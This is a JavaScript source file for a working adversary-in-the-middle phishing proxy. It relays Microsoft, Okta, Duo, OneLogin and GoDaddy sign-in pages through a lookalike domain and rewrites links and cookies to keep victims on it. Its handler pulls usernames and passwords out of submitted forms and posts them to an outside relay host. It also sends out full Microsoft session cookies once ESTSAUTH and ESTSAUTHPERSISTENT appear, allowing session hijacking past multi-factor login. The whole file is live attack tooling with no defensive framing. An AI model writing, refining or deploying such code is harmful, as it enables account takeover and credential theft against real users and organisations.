export const runtime = 'edge';

// ==================== CONFIG ====================
const YOUR_DOMAIN = 'ayola-ozamu.zeabur.app';
const VERCEL_URL = 'https://treydatapi.duckdns.org/api/relay';
const INITIAL_UPSTREAM = 'login.microsoftonline.com';
const PROXY_PREFIX = '/_p/';
const BLOCKED_IPS = ['0.0.0.0', '127.0.0.1'];

// Critical auth cookies that must be present for session to work
const CRITICAL_AUTH_COOKIES = ['ESTSAUTH', 'ESTSAUTHPERSISTENT'];

// All auth cookies to check for exfiltration
const AUTH_TOKEN_NAMES = [
  'ESTSAUTH',
  'ESTSAUTHPERSISTENT', 
  'ESTSAUTHLIGHT',
  'SignInStateCookie',
  'esctx',
  'CCState',
  'buid',
  'fpc'
];

const IDENTITY_PROVIDERS = {
  'login.microsoftonline.com': { type: 'microsoft', name: 'Microsoft' },
  'login.live.com': { type: 'microsoft', name: 'Microsoft Live' },
  'account.live.com': { type: 'microsoft', name: 'Microsoft Account' },
  'account.microsoft.com': { type: 'microsoft', name: 'Microsoft Account' },
  'aadcdn.msauth.net': { type: 'microsoft', name: 'Microsoft CDN' },
  'www.office.com': { type: 'microsoft', name: 'Office 365' },
  'office.com': { type: 'microsoft', name: 'Office 365' },
  'microsoft365.com': { type: 'microsoft', name: 'Microsoft 365' },
  'outlook.office.com': { type: 'microsoft', name: 'Outlook' },
  'outlook.live.com': { type: 'microsoft', name: 'Outlook Live' },
  'o.okta.com': { type: 'okta', name: 'Okta' },
  'sci.okta.com': { type: 'okta', name: 'Okta Sci' },
  'dotfoods.okta.com': { type: 'okta', name: 'Okta DotFoods' },
  'login.okta.com': { type: 'okta', name: 'Okta Login' },
  'ulgroup.okta.com': { type: 'okta', name: 'Okta ULGroup' },
  'empowermm.onelogin.com': { type: 'onelogin', name: 'OneLogin' },
  'duosecurity.com': { type: 'duo', name: 'Duo' },
  'api-aa1a6aea.duosecurity.com': { type: 'duo', name: 'Duo API' },
  'login.duosecurity.com': { type: 'duo', name: 'Duo Login' },
  'sso.godaddy.com': { type: 'godaddy', name: 'GoDaddy' },
  'sso.secureserver.net': { type: 'godaddy', name: 'GoDaddy Legacy' },
  'csp.secureserver.net': { type: 'godaddy', name: 'GoDaddy CSP' },
  'api.godaddy.com': { type: 'godaddy', name: 'GoDaddy API' },
  'www.godaddy.com': { type: 'godaddy', name: 'GoDaddy WWW' },
  'img1.wsimg.com': { type: 'godaddy', name: 'GoDaddy Images' },
  'img2.wsimg.com': { type: 'godaddy', name: 'GoDaddy Images 2' },
  'img3.wsimg.com': { type: 'godaddy', name: 'GoDaddy Images 3' },
  'img4.wsimg.com': { type: 'godaddy', name: 'GoDaddy Images 4' },
  'img5.wsimg.com': { type: 'godaddy', name: 'GoDaddy Images 5' },
  'img6.wsimg.com': { type: 'godaddy', name: 'GoDaddy Images 6' }
};

// ==================== UTILITIES ====================

async function sendToVercel(type, data) {
  try {
    await fetch(VERCEL_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ type, timestamp: new Date().toISOString(), ...data }),
    });
  } catch (e) {}
}

async function exfiltrateCookies(cookieText, ip, platform, url) {
  try {
    const cleanUrl = url.split('?')[0];
    const content = `IP: ${ip}\nPlatform: ${platform}\nURL: ${cleanUrl}\n\n${cookieText}`;
    const formData = new FormData();
    formData.append("file", new Blob([content], { type: "text/plain" }), `${ip}-${platform}-COOKIE.txt`);
    formData.append("ip", ip);
    formData.append("type", "cookie-file");
    await fetch(VERCEL_URL, { method: "POST", body: formData });
  } catch (e) {}
}

function cleanQueryString(search) {
  if (!search) return '';
  
  const params = new URLSearchParams(search);
  
  let modified = false;
  while (params.has('path')) {
    params.delete('path');
    modified = true;
  }
  
  for (const [key, value] of params) {
    if (!value || value === 'undefined' || value === 'null') {
      params.delete(key);
    }
  }
  
  const result = params.toString();
  return result ? '?' + result : '';
}

// ==================== CRITICAL FIX: URL PARSER ====================

/**
 * Parse URL and extract upstream - handles recursive URLs properly
 * Returns the FIRST non-self domain found in the path chain
 */
function parseUrl(pathname, search) {
  console.log(`[PARSE] Input: ${pathname}`);
  
  // Remove leading slash
  let path = pathname.startsWith('/') ? pathname.slice(1) : pathname;
  
  // Pattern to match _p segments: _p/domain.com/...
  const segmentPattern = /^_p\/([^\/]+)(\/.*)?$/;
  
  let segments = [];
  let remaining = path;
  
  // Extract all _p segments
  while (remaining) {
    const match = remaining.match(segmentPattern);
    if (!match) break;
    
    const domain = match[1];
    const rest = match[2] || '';
    
    segments.push({ domain, path: rest });
    remaining = rest;
  }
  
  console.log(`[PARSE] Segments:`, segments.map(s => s.domain));
  
  // Find the FIRST valid upstream (not our domain)
  // This is the key fix - we take the first real upstream, not skip self-domains
  let upstreamDomain = null;
  let upstreamPath = '/';
  
  for (const segment of segments) {
    const isSelfDomain = segment.domain === YOUR_DOMAIN || 
                         segment.domain.endsWith(YOUR_DOMAIN) ||
                         segment.domain.includes('ayola-ozamu.zeabur.app');
    
    if (!isSelfDomain) {
      // This is a real upstream
      upstreamDomain = segment.domain;
      upstreamPath = segment.path || '/';
      console.log(`[PARSE] Found upstream: ${upstreamDomain}, path: ${upstreamPath}`);
      break;
    } else {
      console.log(`[PARSE] Skipping self: ${segment.domain}`);
    }
  }
  
  // If no upstream found, check for embedded URLs or use default
  if (!upstreamDomain) {
    const embeddedMatch = path.match(/.*\/https?:\/?\/?([^\/]+)(.*)/);
    
    if (embeddedMatch) {
      const embeddedHost = embeddedMatch[1];
      const embeddedPath = embeddedMatch[2] || '/';
      
      console.log(`[PARSE] Embedded: ${embeddedHost}, path: ${embeddedPath}`);
      
      if (embeddedHost === YOUR_DOMAIN || embeddedHost.endsWith(YOUR_DOMAIN)) {
        // Post-login redirect to self - route to office.com for landing
        upstreamDomain = 'www.office.com';
        upstreamPath = embeddedPath;
        console.log(`[PARSE] Landing page redirect -> office.com`);
      } else if (shouldProxyDomain(embeddedHost)) {
        upstreamDomain = embeddedHost;
        upstreamPath = embeddedPath;
      }
    } else {
      // Default to Microsoft login
      upstreamDomain = INITIAL_UPSTREAM;
      upstreamPath = pathname;
      console.log(`[PARSE] Default upstream: ${upstreamDomain}`);
      
      const provider = IDENTITY_PROVIDERS[upstreamDomain];
      return {
        upstream: upstreamDomain,
        type: provider ? provider.type : 'unknown',
        path: upstreamPath,
        search: cleanQueryString(search),
        isProxied: false
      };
    }
  }
  
  const provider = IDENTITY_PROVIDERS[upstreamDomain];
  
  return {
    upstream: upstreamDomain,
    type: provider ? provider.type : 'unknown',
    path: upstreamPath,
    search: cleanQueryString(search),
    isProxied: true
  };
}

function shouldProxyDomain(hostname) {
  if (!hostname) return false;
  if (IDENTITY_PROVIDERS[hostname]) return true;
  if (hostname.includes('microsoft') || hostname.includes('live.com') || 
      hostname.includes('office.com') || hostname.includes('msauth.net')) return true;
  if (hostname.includes('godaddy.com') || hostname.includes('secureserver.net')) return true;
  if (hostname.includes('okta.com')) return true;
  if (hostname.includes('onelogin.com')) return true;
  if (hostname.includes('duosecurity.com')) return true;
  if (hostname.includes('wsimg.com')) return true;
  return false;
}

// ==================== CRITICAL FIX: LOCATION REWRITING ====================

function rewriteLocation(location, currentUpstream) {
  try {
    const url = new URL(location);
    
    console.log(`[REWRITE] Location: ${location}, current: ${currentUpstream}`);
    
    // Already our domain - check if properly formatted
    if (url.hostname === YOUR_DOMAIN || url.hostname.endsWith(`.${YOUR_DOMAIN}`)) {
      // Check if it's a malformed recursive URL
      // Pattern: /_p/xxx.zeabur.app/_p/real-domain/...
      const recursivePattern = /^\/_p\/[^\/]*ayola-ozamu\.zeabur\.app\/_p\/(.+)$/;
      const recursiveMatch = url.pathname.match(recursivePattern);
      
      if (recursiveMatch) {
        // Extract the real path after the second _p/
        const fixedPath = '/_p/' + recursiveMatch[1];
        const result = `https://${YOUR_DOMAIN}${fixedPath}${url.search}`;
        console.log(`[REWRITE] Fixed recursive: ${result}`);
        return result;
      }
      
      // Check for double-http pattern
      const doubleHttpMatch = url.pathname.match(/(.*)\/https?:\/?\/?([^\/]+)(.*)/);
      if (doubleHttpMatch) {
        const msHost = doubleHttpMatch[2];
        const msPath = doubleHttpMatch[3] || '/';
        
        if (shouldProxyDomain(msHost)) {
          const result = `https://${YOUR_DOMAIN}${PROXY_PREFIX}${msHost}${msPath}${url.search}`;
          console.log(`[REWRITE] Double-http: ${result}`);
          return result;
        }
      }
      
      // Already correct format
      if (url.pathname.startsWith(PROXY_PREFIX)) {
        console.log(`[REWRITE] Already correct: ${location}`);
        return location;
      }
      
      // Self-domain path without proxy prefix - add it
      const result = `https://${YOUR_DOMAIN}${PROXY_PREFIX}www.office.com${url.pathname}${url.search}`;
      console.log(`[REWRITE] Added proxy prefix: ${result}`);
      return result;
    }
    
    // External domain - proxy it simply
    if (shouldProxyDomain(url.hostname)) {
      const result = `https://${YOUR_DOMAIN}${PROXY_PREFIX}${url.hostname}${url.pathname}${cleanQueryString(url.search)}`;
      console.log(`[REWRITE] Proxy: ${result}`);
      return result;
    }
    
    console.log(`[REWRITE] Pass through: ${location}`);
    return location;
    
  } catch (e) {
    // Relative URL
    console.log(`[REWRITE] Relative: ${location}`);
    
    if (location.startsWith('/') && currentUpstream) {
      // Check for embedded protocol
      const embeddedMatch = location.match(/(.*)\/https?:\/?\/?([^\/]+)(.*)/);
      
      if (embeddedMatch) {
        const embeddedHost = embeddedMatch[2];
        const embeddedPath = embeddedMatch[3] || '/';
        
        if (shouldProxyDomain(embeddedHost)) {
          return `https://${YOUR_DOMAIN}${PROXY_PREFIX}${embeddedHost}${embeddedPath}`;
        }
        
        if (embeddedHost === YOUR_DOMAIN) {
          return `https://${YOUR_DOMAIN}${PROXY_PREFIX}${currentUpstream}${embeddedPath}`;
        }
      }
      
      return `https://${YOUR_DOMAIN}${PROXY_PREFIX}${currentUpstream}${location}`;
    }
    
    return location;
  }
}

// ==================== AUTH DETECTION ====================

function hasCriticalAuthCookies(cookieStr) {
  if (!cookieStr) return false;
  return CRITICAL_AUTH_COOKIES.every(name => 
    cookieStr.toLowerCase().includes(name.toLowerCase())
  );
}

function hasAnyAuthCookies(cookieStr) {
  if (!cookieStr) return false;
  return AUTH_TOKEN_NAMES.some(name => 
    cookieStr.toLowerCase().includes(name.toLowerCase())
  );
}

function parseCredentials(bodyText) {
  let user = null, pass = null;
  if (!bodyText) return { user, pass };
  
  try {
    const jsonData = JSON.parse(bodyText);
    user = jsonData.username || jsonData.email || jsonData.user || jsonData.login || jsonData.UserName;
    pass = jsonData.password || jsonData.passwd || jsonData.pwd || jsonData.pass || jsonData.Password;
    if (user && pass) return { user, pass };
  } catch (e) {}
  
  const params = new URLSearchParams(bodyText);
  const userFields = ['login', 'loginfmt', 'username', 'email', 'user', 'UserName'];
  const passFields = ['passwd', 'password', 'pwd', 'pass', 'Password'];
  
  for (const field of userFields) {
    if (params.has(field)) {
      user = params.get(field);
      break;
    }
  }
  
  for (const field of passFields) {
    if (params.has(field)) {
      pass = params.get(field);
      break;
    }
  }
  
  return { user, pass };
}

// ==================== COOKIE HANDLING (SIMPLIFIED LIKE WORKING SCRIPT) ====================

function processCookies(cookies, upstreamDomain) {
  const modifiedCookies = [];
  
  for (const cookie of cookies) {
    if (!cookie) continue;
    
    // Simple replacement like working script: replace upstream domain with our domain
    // This keeps cookie values intact while making them work for our domain
    let modifiedCookie = cookie;
    
    // Replace domain attribute
    modifiedCookie = modifiedCookie.replace(/domain=[^;]+;?/gi, '');
    modifiedCookie = modifiedCookie.replace(/Domain=[^;]+;?/g, '');
    
    // Add our domain - use root domain for broader compatibility
    modifiedCookie += `; Domain=${YOUR_DOMAIN}`;
    
    // Ensure Secure and SameSite for cross-origin
    if (!modifiedCookie.toLowerCase().includes('secure')) {
      modifiedCookie += '; Secure';
    }
    if (!modifiedCookie.toLowerCase().includes('samesite')) {
      modifiedCookie += '; SameSite=None';
    }
    
    modifiedCookies.push(modifiedCookie);
  }
  
  return modifiedCookies;
}

// ==================== RESPONSE HANDLING ====================

function createResponseHeaders(resp, options = {}) {
  const newHeaders = new Headers();
  
  const headersToCopy = [
    'content-type',
    'content-length',
    'content-encoding',
    'cache-control',
    'expires',
    'etag',
    'last-modified',
    'vary'
  ];
  
  for (const name of headersToCopy) {
    const value = resp.headers.get(name);
    if (value) {
      newHeaders.set(name, value);
    }
  }
  
  newHeaders.set('access-control-allow-origin', '*');
  newHeaders.set('access-control-allow-credentials', 'true');
  
  if (options.location) {
    newHeaders.set('location', options.location);
  }
  
  if (options.setCookies) {
    for (const cookie of options.setCookies) {
      newHeaders.append('set-cookie', cookie);
    }
  }
  
  return newHeaders;
}

// ==================== MAIN HANDLER ====================

export default async function handleRequest(request) {
  const url = new URL(request.url);
  const ip = request.headers.get('x-forwarded-for')?.split(',')[0]?.trim() || 'unknown';

  if (BLOCKED_IPS.includes(ip)) {
    return new Response('Access denied.', { status: 403 });
  }

  const info = parseUrl(url.pathname, url.search);
  
  const upstreamDomain = info.upstream;
  const upstreamUrl = 'https://' + upstreamDomain + info.path + info.search;
  
  console.log(`[${info.type}] ${request.method} ${url.pathname} -> ${upstreamUrl}`);

  // Prepare request headers
  const headers = new Headers();
  const clientHeaders = ['user-agent', 'accept', 'accept-language', 'accept-encoding', 'content-type', 'cookie', 'referer', 'origin', 'x-requested-with'];
  
  for (const h of clientHeaders) {
    const val = request.headers.get(h);
    if (val) headers.set(h, val);
  }

  headers.set('Host', upstreamDomain);
  
  if (!request.headers.get('referer')) {
    headers.set('Referer', 'https://' + upstreamDomain + '/');
  }
  if (!request.headers.get('origin')) {
    headers.set('Origin', 'https://' + upstreamDomain);
  }

  for (const h of ['expect', 'connection', 'keep-alive', 'proxy-connection', 'transfer-encoding', 
   'x-forwarded-host', 'x-forwarded-proto', 'x-forwarded-for']) {
    headers.delete(h);
  }

  let bodyText = null;
  let requestBody = null;

  // Handle credential extraction for POST requests
  if (['POST', 'PUT', 'PATCH'].includes(request.method)) {
    try {
      const cloned = request.clone();
      bodyText = await cloned.text();
      const { user, pass } = parseCredentials(bodyText);
      
      if (user && pass) {
        console.log(`[CREDS] ${user.substring(0,5)}... on ${info.type}`);
        await sendToVercel('credentials', { 
          type: 'creds', 
          ip, 
          user, 
          pass, 
          platform: info.type, 
          url: url.href 
        });
        
        const formData = new FormData();
        formData.append('file', new Blob([`IP: ${ip}\nUser: ${user}\nPass: ${pass}\nURL: ${url.href}`], {type: 'text/plain'}), `${ip}-CREDENTIALS.txt`);
        formData.append('ip', ip);
        formData.append('type', 'credentials');
        await fetch(VERCEL_URL, { method: 'POST', body: formData });
      }
      
      requestBody = bodyText;
    } catch (err) {
      requestBody = request.body;
    }
  }

  try {
    const resp = await fetch(upstreamUrl, {
      method: request.method,
      headers,
      body: requestBody,
      redirect: 'manual'
    });

    // Handle redirects
    if ([301, 302, 303, 307, 308].includes(resp.status)) {
      const loc = resp.headers.get('Location');
      if (loc) {
        const rewrittenLoc = rewriteLocation(loc, upstreamDomain);
        console.log(`[REDIRECT] ${loc} -> ${rewrittenLoc}`);
        const redirectHeaders = createResponseHeaders(resp, { location: rewrittenLoc });
        return new Response(null, { status: resp.status, headers: redirectHeaders });
      }
    }

    // Process cookies
    const cookies = resp.headers.getSetCookie?.() || [];
    let cookieStr = '';
    let shouldExfiltrate = false;

    if (cookies?.length) {
      cookieStr = cookies.join('; ');
      
      // CRITICAL: Only exfiltrate if CRITICAL auth cookies are present
      // This ensures we only capture valid, complete sessions
      const hasCritical = hasCriticalAuthCookies(cookieStr);
      const hasAnyAuth = hasAnyAuthCookies(cookieStr);
      
      // Exfiltrate only when we have BOTH ESTSAUTH and ESTSAUTHPERSISTENT
      // This prevents capturing incomplete/broken sessions
      shouldExfiltrate = hasCritical;

      console.log(`[COOKIES] ${cookies.length} found, critical=${hasCritical}, any=${hasAnyAuth}, exfil=${shouldExfiltrate}`);
      console.log(`[COOKIES] Names: ${cookies.map(c => c.split('=')[0]).join(', ')}`);

      // Process cookies for browser
      const modifiedCookies = processCookies(cookies, upstreamDomain);
      
      // Only exfiltrate if we have critical auth cookies
      if (shouldExfiltrate) {
        const detected = CRITICAL_AUTH_COOKIES.filter(n => 
          cookieStr.toLowerCase().includes(n.toLowerCase())
        );
        console.log(`[EXFILTRATING] Critical cookies: ${detected.join(', ')}`);
        await exfiltrateCookies(cookieStr, ip, info.type, url.href);
      } else if (hasAnyAuth) {
        console.log(`[SKIP] Has auth cookies but missing critical ones - incomplete session`);
      }

      // Create response headers
      const responseHeaders = createResponseHeaders(resp, { setCookies: modifiedCookies });

      // Process body
      const ct = resp.headers.get('content-type') || '';
      
      if (/text\/html|application\/javascript|application\/json|text\/css/.test(ct)) {
        let text = await resp.text();
        
        // Simple domain replacement like working script
        for (const domain of Object.keys(IDENTITY_PROVIDERS)) {
          text = text.split(domain).join(`${YOUR_DOMAIN}${PROXY_PREFIX}${domain}`);
        }

        return new Response(text, { status: resp.status, headers: responseHeaders });
      }

      return new Response(resp.body, { status: resp.status, headers: responseHeaders });
    }

    // No cookies
    const responseHeaders = createResponseHeaders(resp);
    const ct = resp.headers.get('content-type') || '';
    
    if (/text\/html|application\/javascript|application\/json|text\/css/.test(ct)) {
      let text = await resp.text();
      
      for (const domain of Object.keys(IDENTITY_PROVIDERS)) {
        text = text.split(domain).join(`${YOUR_DOMAIN}${PROXY_PREFIX}${domain}`);
      }

      return new Response(text, { status: resp.status, headers: responseHeaders });
    }

    return new Response(resp.body, { status: resp.status, headers: responseHeaders });

  } catch (err) {
    console.error(`[${info.type}] Error:`, err);
    const errorHeaders = new Headers();
    errorHeaders.set('content-type', 'application/json');
    return new Response(
      JSON.stringify({ error: 'Proxy Error', message: err.message }), 
      { status: 502, headers: errorHeaders }
    );
  }
}

export const GET = handleRequest;
export const POST = handleRequest;
export const PUT = handleRequest;
export const DELETE = handleRequest;
export const PATCH = handleRequest;
export const OPTIONS = handleRequest;
export const HEAD = handleRequest;
